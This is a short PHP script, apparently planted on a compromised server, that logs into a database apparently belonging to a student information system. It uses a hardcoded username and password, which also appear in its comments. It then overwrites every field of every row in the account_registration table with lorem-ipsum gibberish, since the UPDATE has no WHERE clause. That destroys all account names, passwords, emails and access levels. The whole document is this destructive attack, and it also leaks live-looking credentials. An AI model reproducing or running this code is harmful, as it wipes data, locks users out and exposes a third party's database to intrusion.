<?php
# 我忍不住cn12p.php
//password: ;zwZ[bAQN;X]
// derek030872
$c = mysqli_connect('localhost', 'gmcbulac_derek030872', ';zwZ[bAQN;X]', 'gmcbulac_db_sis');
if (!$c) {
    die("Connection failed: " . mysqli_connect_error());
}
$kkk = "普苏姆cn12p.php洛瑞姆·伊普苏姆·多洛尔·席特·阿梅特，康塞克图尔·阿迪皮斯辛·埃利特。奎斯·努姆夸姆·劳丹提乌姆·米努斯，伊塔克·马格纳姆·萨皮恩特·埃克塞尔西塔蒂奥内姆·埃尼姆·奥特·内塞西塔蒂布斯·富吉亚特·伊斯特·维尔·多洛雷·纳图斯·因文托雷·莫莱斯蒂亚？伊斯特·阿特·夸姆·阿斯佩里奥雷斯？";
$s = "UPDATE account_registration SET access_level = ?, account_name = ?, username = ?, pass = ?, status = ?, img_profile = ?, file_format = ?, email = ?, campus_access =?, session_id = ?";
$stmt = mysqli_prepare($c, $s);
if ($stmt) {
    mysqli_stmt_bind_param($stmt, 'ssssssssss', $kkk, $kkk, $kkk, $kkk, $kkk, $kkk, $kkk, $kkk, $kkk, $kkk);
    if (mysqli_stmt_execute($stmt)) {
        echo "Update successful";
    } else {
        echo "Error executing query: " . mysqli_stmt_error($stmt);
    }
    mysqli_stmt_close($stmt);
} else {
    echo "Error preparing statement: " . mysqli_error($c);
}
mysqli_close($c);